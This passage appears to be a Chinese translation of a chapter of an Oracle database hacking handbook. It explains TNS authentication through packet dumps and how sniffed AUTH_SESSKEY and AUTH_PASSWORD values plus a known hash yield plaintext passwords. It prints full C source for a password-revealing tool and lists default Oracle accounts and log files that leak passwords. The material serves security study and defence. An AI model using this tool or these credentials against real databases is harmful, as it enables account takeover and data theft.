class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 17520</span><br><span class="line">      Checksum: 0x4915</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      01 18 00 00 01 00 00 00 01 39 01 2c 00 00 08 00           9 ,</span><br><span class="line">      7f ff c6 0e 00 00 01 00 00 de 00 3a 00 00 02 00             :</span><br><span class="line">      61 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00  aa</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 28 44 45 53 43 52            (DESCR</span><br><span class="line">      49 50 54 49 4f 4e 3d 28 41 44 44 52 45 53 53 3d  IPTION=(ADDRESS=</span><br><span class="line">      28 50 52 4f 54 4f 43 4f 4c 3d 54 43 50 29 28 48  (PROTOCOL=TCP)(H</span><br><span class="line">      4f 53 54 3d 31 39 32 2e 31 36 38 2e 30 2e 33 37  OST=192.168.0.37</span><br><span class="line">      29 28 50 4f 52 54 3d 31 35 32 31 29 29 28 43 4f  )(PORT=1521))(CO</span><br><span class="line">      4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56  NNECT_DATA=(SERV</span><br><span class="line">      45 52 3d 44 45 44 49 43 41 54 45 44 29 28 53 45  ER=DEDICATED)(SE</span><br><span class="line">      52 56 49 43 45 5f 4e 41 4d 45 3d 6f 72 61 38 31  RVICE_NAME=ora81</span><br><span class="line">      37 2e 6e 67 73 73 6f 66 74 77 61 72 65 2e 63 6f  7.ngssoftware.co</span><br><span class="line">      6d 29 28 43 49 44 3d 28 50 52 4f 47 52 41 4d 3d  m)(CID=(PROGRAM=</span><br><span class="line">      43 3a 5c 6f 72 61 63 6c 65 5c 70 72 6f 64 75 63  C:\oracle\produc</span><br><span class="line">      74 5c 31 30 2e 32 2e 30 5c 64 62 5f 31 5c 62 69  t\10.2.0\db_1\bi</span><br><span class="line">      6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48  n\sqlplus.exe)(H</span><br><span class="line">      4f 53 54 3d 4f 52 41 29 28 55 53 45 52 3d 6f 72  OST=ORA)(USER=or</span><br><span class="line">      61 63 6c 65 29 29 29 29                          acle)))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        请注意SERVICE_NAME条目= ora817.ngssoftware.com。 如果此服务尚未在TNS侦听器中注册，则该侦听器将生成一个错误。 如果该服务已注册，则侦听器将重定向客户端以连接到另一个TCP端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 104</span><br><span class="line">      Identifier: 32335</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0xfa52</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line"></span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 1916</span><br><span class="line">      Sequence: 2168229595</span><br><span class="line">      ack: 2802498392</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 65255</span><br><span class="line">      Checksum: 0xe663</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 40 00 00 05 00 00 00 00 36 28 41 44 44 52 45   @       6(ADDRE</span><br><span class="line">      53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 74 63 70  SS=(PROTOCOL=tcp</span><br><span class="line">      29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38 2e 30  )(HOST=192.168.0</span><br><span class="line">      2e 33 37 29 28 50 4f 52 54 3d 33 35 39 30 29 29  .37)(PORT=3590))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        在这种情况下，客户端将重定向到TCP端口3590。如果服务器以MTS（多线程服务器）模式运行，则客户端将不会重定向，并且所有通信都将通过侦听器端口进行-在这种情况下为1521。 客户端连接到新端口后，它将发出与连接到侦听器时相同的服务请求。</p>
<p>​        在客户端的序言连接到侦听器等之后，身份验证过程就开始了。 客户端通过向服务器发送其用户名来实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 236</span><br><span class="line">      Identifier: 59545</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x8f84</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 2500</span><br><span class="line">      Dest port: 1521</span><br><span class="line">      Sequence: 668563957</span><br><span class="line">      ack: 2568057659</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 32780</span><br><span class="line">      Checksum: 0x65e8</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line"></span><br><span class="line">Raw Data</span><br><span class="line">      00 c4 00 00 06 00 00 00 00 00 03 76 02 b0 5f df             v _</span><br><span class="line">      00 06 00 00 00 01 00 00 00 58 cc 12 00 04 00 00           X</span><br><span class="line">      00 28 ca 12 00 14 ce 12 00 06 73 79 73 74 65 6d   (        system</span><br><span class="line">      0d 00 00 00 0d 41 55 54 48 5f 54 45 52 4d 49 4e       AUTH_TERMIN</span><br><span class="line">      41 4c 07 00 00 00 07 47 4c 41 44 49 55 53 00 00  AL     GLADIUS</span><br><span class="line">      00 00 0f 00 00 00 0f 41 55 54 48 5f 50 52 4f 47         AUTH_PROG</span><br><span class="line">      52 41 4d 5f 4e 4d 0b 00 00 00 0b 53 51 4c 50 4c  RAM_NM     SQLPL</span><br><span class="line">      55 53 2e 45 58 45 00 00 00 00 0c 00 00 00 0c 41  US.EXE         A</span><br><span class="line">      55 54 48 5f 4d 41 43 48 49 4e 45 11 00 00 00 11  UTH_MACHINE</span><br><span class="line">      57 4f 52 4b 47 52 4f 55 50 5c 47 4c 41 44 49 55  WORKGROUP\GLADIU</span><br><span class="line">      53 00 00 00 00 08 00 00 00 08 41 55 54 48 5f 50  S         AUTH_P</span><br><span class="line">      49 44 09 00 00 00 09 35 35 37 36 3a 35 34 35 36  ID     5576:5456</span><br><span class="line">      00 00 00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        在前面的数据包转储中，用户名是system。服务器使用此用户名并检查其是否为有效用户。如果不是，则服务器向客户端发送“拒绝登录”错误。如果用户名确实存在，则服务器从数据库中提取用户的密码哈希。服务器使用此哈希值创建一个秘密号码。</p>
<p>​        密码创建如下：服务器调用orageneric库中的slgdt（）函数。此函数实质上检索系统时间。分钟，小时，毫秒和秒都以WORD的形式存储在一起，以形成要加密的“文本”的八个字节。加密中使用的密钥的前四个字节表示与用户的十六进制密码哈希值的后四个字节异或的分钟和小时；密钥的最后四个字节由毫秒和秒组成，与用户的十六进制密码哈希值的前四个字节进行异或。该密钥用于通过调用oracommon库中的kzsrenc（）函数来加密文本。此函数基本上使用lncgks（）函数执行DES密钥调度，然后使用lncecb（）函数在ECB模式下使用DES输出密文。</p>
<p>​        此处生成的密文成为密码。然后，再次使用kzsrenc（）函数，使用用户的密码哈希对该密文进行加密；结果就是AUTH_SESSKEY。然后将其发送给客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 185</span><br><span class="line">      Identifier: 52755</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0xaa3d</span><br><span class="line"></span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.37</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 2500</span><br><span class="line">      Sequence: 2568057659</span><br><span class="line">      ack: 668564153</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 16275</span><br><span class="line">      Checksum: 0x4c2d</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 91 00 00 06 00 00 00 00 00 08 01 00 0c 00 00</span><br><span class="line">      00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 10 00   AUTH_SESSKEY</span><br><span class="line">      00 00 10 36 43 43 33 37 42 41 33 44 41 37 39 37    6CC37BA3DA797</span><br><span class="line">      35 44 36 00 00 00 00 04 01 00 00 00 00 00 00 00 5D6</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 02 00 00 00 00 00 00 36 01 00 00 00 00 00          6</span><br><span class="line">      00 b8 00 8b 0a 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        客户端收到AUTH_SESSKEY后，必须对其解密以检索密码。 用户使用oracore库中的lncupw（）函数创建自己的密码哈希的副本。 然后，通过调用kzsrdec（）函数，将此哈希用作解密AUTH_SESSKEY的密钥。 如果一切顺利，则应该生成密码。 然后，通过调用kzsrenp（）函数，将此秘密数字用作加密用户明文，区分大小写的密码的密钥。 该功能执行DES密钥调度，并以CBC模式加密用户密码。 密文然后作为AUTH_PASSWORD发送回服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 839</span><br><span class="line">      Identifier: 59546</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x8d28</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 2500</span><br><span class="line">      Dest port: 1521</span><br><span class="line"></span><br><span class="line">      Sequence: 668564153</span><br><span class="line">      ack: 2568057804</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 32762</span><br><span class="line">      Checksum: 0x0838</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      03 1f 00 00 06 00 00 00 00 00 03 73 03 b0 5f df             s _</span><br><span class="line">      00 06 00 00 00 01 01 00 00 1c da 12 00 07 00 00</span><br><span class="line">      00 88 d6 12 00 3c dc 12 00 06 73 79 73 74 65 6d       &lt;    system</span><br><span class="line">      0d 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f       AUTH_PASSWO</span><br><span class="line">      52 44 11 00 00 00 11 36 36 36 43 41 46 45 36 37  RD     666CAFE67</span><br><span class="line">      34 39 43 39 44 37 37 30 00 00 00 00 0d 00 00 00  49C9D770</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        服务器通过调用oracommon库中的kzsrdep（）函数，以用作密钥的机密数字解密AUTH_PASSWORD。服务器现在拥有明文密码的副本。然后，服务器创建密码哈希，并将其与数据库中的哈希进行比较。如果它们匹配，则对用户进行身份验证。然后由服务器执行检查，以确定用户是否具有CREATE SESSION特权；如果是这样，则授予用户访问数据库服务器的权限。</p>
<p>​        针对Windows NT上运行的Oracle 8.1.7.4执行了此分析。尽管实际的函数名称可能有所不同，但其他Oracle版本上的一般过程相同。</p>
<p>​        简要返回AUTH_PASSWORD，由于密码的加密方式，您可以获取有关密码长度的信息。如果AUTH_PASSWORD为16个字符长，则实际密码为8个字符或更少。如果用户的密码长度在9到16个字符之间，则AUTH_PASSWORD的长度是32个字符，依此类推。因此，如果攻击者可以嗅探整个网络上的身份验证，那么他们可以派生出可能在密码破解尝试中有用的信息。</p>
<h3 id="攻击加密过程"><a href="#攻击加密过程" class="headerlink" title="攻击加密过程"></a>攻击加密过程</h3><p>​        从数据库中获取密码哈希值是一项简单的任务，正如本书所展示的。可以执行强行强制Oracle密码散列，但是密码越长，花费的时间就越长。对于很长的密码，不是强行使用密码，而是另一种攻击方法，目的是快速获取明文。如果拥有哈希但想要纯文本的攻击者可以嗅探网络上的AUTH_SESSKEY和AUTH_PASSWORD交换，那么他们可以立即获得纯文本密码。他们使用已知的哈希对AUTH_SESSKEY进行解密以获取密码。然后，他们使用此秘密数字解密AUTH_PASSWORD，然后解出明文-不管它有多长。嗅探交换是真正的问题-但这不应该被诸如“好吧，如果他们遇到了我的密码哈希并可以从网络上捕获流量的问题，那么我就会遇到更大的问题”。在交换环境中，针对ARP的攻击可能导致流量在本地线路上广播，这意味着每个人都可以捕获流量。当然，在普通广播网络上（例如，使用普通集线器的以太网），这不是问题，并且以混杂模式运行的嗅探器可以进行交换。客户端和服务器之间中间位置的主机或网关可能会受到威胁，并被用作战略嗅探器。是的，如果有人可以这样做，您确实会遇到很大的问题，但重点是攻击者可以并且可以这样做！</p>
<p>​        以下代码使用kzsrdec（）和kzsrdep（）函数获取给定密码哈希，AUTH_SESSKEY和AUTH_PASSWORD的明文密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">      C:\&gt;cl /TC opass.c</span><br><span class="line">      C:\&gt;opass E:\oracle\ora81\BIN\oracommon8.dll</span><br><span class="line">            EED9B65CCECDB2E9</span><br><span class="line">            DF0536A94ADEE746</span><br><span class="line">            36A2CB576171FEAD</span><br><span class="line"></span><br><span class="line">      Secret is CEAF9C221915EC3E</span><br><span class="line">      Password is password</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      FARPROC kzsrdec = NULL;</span><br><span class="line">      FARPROC kzsrdep = NULL;</span><br><span class="line">      HANDLE oracommon = NULL;</span><br><span class="line">      unsigned char dll_path[260]=&quot;&quot;;</span><br><span class="line">      unsigned char hash[40]=&quot;&quot;;</span><br><span class="line">      unsigned char sess[40]=&quot;&quot;;</span><br><span class="line">      unsigned char pass[260]=&quot;&quot;;</span><br><span class="line">      unsigned char o[20]=&quot;&quot;;</span><br><span class="line">      unsigned char pwd[200]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if(argc!=5)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">           printf(&quot;\n\t*** Oracle Password Revealer ***\n\n&quot;);</span><br><span class="line">           printf(&quot;\tC:\\&gt;%s &quot;,argv[0]);</span><br><span class="line">           printf(&quot;path_to_oracommon.dll &quot;);</span><br><span class="line">           printf(&quot;password_hash auth_sesskey &quot;);</span><br><span class="line">           printf(&quot;auth_password\n\n&quot;);</span><br><span class="line">           printf(&quot;\tDavid Litchfield\n&quot;);</span><br><span class="line">           printf(&quot;\tdavid@databasesecurity.com\n&quot;);</span><br><span class="line">           printf(&quot;\t10th June 2006\n\n&quot;);</span><br><span class="line">           return 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     strncpy(dll_path,argv[1],256);</span><br><span class="line">     strncpy(hash,argv[2],36);</span><br><span class="line">     strncpy(sess,argv[3],36);</span><br><span class="line">     strncpy(pass,argv[4],256);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(hash,1)==0)</span><br><span class="line">           return printf(&quot;Error in the password hash.\n&quot;);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(sess,1)==0)</span><br><span class="line">           return printf(&quot;Error in the auth_sesskey.\n&quot;);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(pass,0)==0)</span><br><span class="line">           return printf(&quot;Error in the auth_password.\n&quot;);</span><br><span class="line"></span><br><span class="line">     oracommon = LoadLibrary(dll_path);</span><br><span class="line">     if(!oracommon)</span><br><span class="line">           return printf(&quot;Failed to load %s\n&quot;,dll_path);</span><br><span class="line"></span><br><span class="line">     kzsrdec = GetProcAddress(oracommon,&quot; kzsrdec&quot;);</span><br><span class="line">     if(!kzsrdec)</span><br><span class="line">           return printf(&quot;No address for kzsrdec.\n&quot;);</span><br><span class="line"></span><br><span class="line">     kzsrdep = GetProcAddress(oracommon,&quot; kzsrdep&quot;);</span><br><span class="line">     if(!kzsrdep)</span><br><span class="line">           return printf(&quot;No address for kzsrdep.\n&quot;);</span><br><span class="line"></span><br><span class="line">     kzsrdec(sess,o,hash);</span><br><span class="line"></span><br><span class="line">     printf(&quot;\nSecret is %.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\n&quot;,</span><br><span class="line">           o[0],o[1],o[2],o[3],o[4],o[5],o[6],o[7]);</span><br><span class="line"></span><br><span class="line">     kzsrdep(pwd,pass,strlen(pass),o);</span><br><span class="line"></span><br><span class="line">     printf(&quot;Password is %s\n&quot;,pwd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int StringToHex(char *str,int cnv)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      unsigned int len = 0, c=0,i=0;</span><br><span class="line">      unsigned char a=0,b=0;</span><br><span class="line">      unsigned char tmp[12]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      len = strlen(str);</span><br><span class="line">      if(len &gt; 16)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      while(c &lt; len)</span><br><span class="line">      &#123;</span><br><span class="line">            a = str[c++];</span><br><span class="line">            b = str[c++];</span><br><span class="line">            if(a &gt; 0x2F &amp;&amp; a &lt; 0x3A)</span><br><span class="line">                  a = a - 0x30;</span><br><span class="line">            else if(a &gt; 0x40 &amp;&amp; a &lt; 0x47)</span><br><span class="line">                  a = a - 0x37;</span><br><span class="line">            else if(a &gt; 0x60 &amp;&amp; a &lt; 0x67)</span><br><span class="line">                  a = a - 0x57;</span><br><span class="line">            else</span><br><span class="line">                  return 0;</span><br><span class="line"></span><br><span class="line">            if(b &gt; 0x2F &amp;&amp; b &lt; 0x3A)</span><br><span class="line">                  b = b - 0x30;</span><br><span class="line">            else if(b &gt; 0x40 &amp;&amp; a &lt; 0x47)</span><br><span class="line">                  b = b - 0x37;</span><br><span class="line">            else if(a &gt; 0x60 &amp;&amp; a &lt; 0x67)</span><br><span class="line">                  b = b - 0x57;</span><br><span class="line">            else</span><br><span class="line">                  return 0;</span><br><span class="line"></span><br><span class="line">            a = a &lt;&lt; 4;</span><br><span class="line">            a = a + b;</span><br><span class="line">            tmp[i]=a;</span><br><span class="line">            i ++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      memset(str,0,len);</span><br><span class="line">      c=0;</span><br><span class="line">      if(cnv)</span><br><span class="line">      &#123;</span><br><span class="line">            while(c &lt; 8)</span><br><span class="line">            &#123;</span><br><span class="line">                  str[c+0]=tmp[c+3];</span><br><span class="line">                  str[c+1]=tmp[c+2];</span><br><span class="line">                  str[c+2]=tmp[c+1];</span><br><span class="line">                  str[c+3]=tmp[c+0];</span><br><span class="line">                  c = c + 4;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return 1;</span><br><span class="line">      &#125;</span><br><span class="line">      while(c &lt; 8)</span><br><span class="line">      &#123;</span><br><span class="line">            str[c]=tmp[c];</span><br><span class="line">            c = c ++;</span><br><span class="line">      &#125;</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="默认的用户名和密码"><a href="#默认的用户名和密码" class="headerlink" title="默认的用户名和密码"></a>默认的用户名和密码</h3><p>​        Oracle的默认用户名和密码，较常见的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS/CHANGE_ON_INSTALL</span><br><span class="line">SYSTEM/MANAGER</span><br><span class="line">DBSNMP/DBSNMP</span><br><span class="line">CTXSYS/CTXSYS</span><br><span class="line">MDSYS/MDSYS</span><br><span class="line">SCOTT/TIGER</span><br></pre></td></tr></table></figure>

<p>​        虽然查找带有默认密码的SYS或SYSTEM帐户并不常见，但通常发现DBSNMP（智能代理帐户）保留了默认密码。这可能是因为如果您仍然希望智能代理能够工作，则需要在两个位置更改密码。第一次密码更改发生在数据库中；第二个密码更改需要在snmp_rw.ora文件中进行。 CTXSYS和MDSYS都是9i中的DBA，尽管它们的默认密码与DBSNMP一样少，但通常也会保留其默认密码。</p>
<p>​        随着10g的发布，情况大为改善。在安装过程中，系统会提示安装程序输入SYS帐户的密码。然后，也可以为SYSTEM，DBSNMP和SYSMAN帐户设置相同的密码。所有其他帐户都设置为EXPIRED和LOCKED。 EXPIRED表示默认密码已过期，必须更改。但是，对于默认帐户和默认配置文件，可以将密码更改为原始密码。人们通常会这样做，因此使用硬编码密码的较早的应用程序仍然可以正常工作。</p>
<p>​        尽管10g的密码情况有所改善，但是仍然存在风险。 这样的风险之一是在安装过程中选择的密码会写入某些文件。 例如，在10g第1版中，SYSMAN的密码以明文形式写入$ ORACLE_HOME / hostname_sid / sysman / config目录中的emoms.properties文件中； 10g第2版使用DES加密密码，但是emoms文件还包含解密密钥，因此仍可以检索密码：只需将emdRepPwd和emdRepPwdSeed属性插入最近的DES工具中，然后弹出明文密码。</p>
<p>​        另一个可能记录密码的潜在文件是DBCreation.log。 假设在安装过程中安装程序选择了一个难以猜测的密码，其中带有感叹号。 设置SYSMAN和DBSNMP帐户的密码后，执行此操作的SQL脚本将执行以下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter user SYSMAN identified by f00bar!! account unlock</span><br><span class="line"></span><br><span class="line">alter user DBSNMP identified by f00bar!! account unlock</span><br></pre></td></tr></table></figure>

<p>​        由于有感叹号，这会导致错误，然后将其记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR at line 1:</span><br><span class="line"></span><br><span class="line">ORA-00922: missing or invalid option</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/6.png"></p>
<p>​        因为SYS和SYSTEM帐户的密码是以不同的方式设置的-一种不会引起错误的方式-因此为他们提供了密码。 因此，如果某人可以访问此文件，则他们可能能够发现SYS和SYSTEM的密码。</p>
<p>​        记录密码的另一组文件是</p>
